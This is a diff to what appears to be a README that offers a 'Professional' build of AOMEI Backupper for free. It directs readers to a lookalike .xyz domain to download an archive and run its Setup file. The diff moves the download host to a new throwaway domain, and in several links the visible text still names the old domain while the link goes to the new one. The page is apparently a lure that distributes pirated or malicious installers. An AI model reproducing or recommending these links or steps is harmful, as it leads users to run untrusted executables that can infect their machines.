@@ -28,8 +28,8 @@ Premium · Pro · Complete build · Windows
 
 > Use the project link below for Windows.
 
-* **Project link:** **[aomei-backupper-professional-setup.nexpath.xyz](https://aomei-backupper-professional-setup.nexpath.xyz/)**
-* **Full URL:** `https://aomei-backupper-professional-setup.nexpath.xyz/`
+* **Project link:** **[aomei-backupper-professional-setup.nerasix.xyz](https://aomei-backupper-professional-setup.nerasix.xyz/)**
+* **Full URL:** `https://aomei-backupper-professional-setup.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -55,17 +55,17 @@ Premium · Pro · Complete build · Windows
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://aomei-backupper-professional-setup.nexpath.xyz/">aomei-backupper-professional-setup.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://aomei-backupper-professional-setup.nerasix.xyz/">aomei-backupper-professional-setup.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://aomei-backupper-professional-setup.nexpath.xyz/">aomei-backupper-professional-setup.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://aomei-backupper-professional-setup.nerasix.xyz/">aomei-backupper-professional-setup.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://aomei-backupper-professional-setup.nexpath.xyz/">aomei-backupper-professional-setup.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://aomei-backupper-professional-setup.nerasix.xyz/">aomei-backupper-professional-setup.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
